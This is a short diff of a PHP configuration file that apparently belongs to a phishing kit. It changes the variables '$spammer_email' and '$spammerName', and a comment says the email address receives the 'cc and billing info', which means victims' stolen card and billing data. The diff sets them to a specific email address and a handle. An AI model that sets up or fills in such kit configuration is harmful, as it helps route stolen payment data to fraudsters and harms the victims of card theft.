@@ -2,11 +2,11 @@
 
 
 # For cc and billing info put Your Email here
-$spammer_email = "ublow53@gmail.com";
+$spammer_email = "samrodriguez937@mail.com";
 
 
 # Your Name here
-$spammerName = "EXEMPLE";
+$spammerName = "M@x";
 
 
 ?>
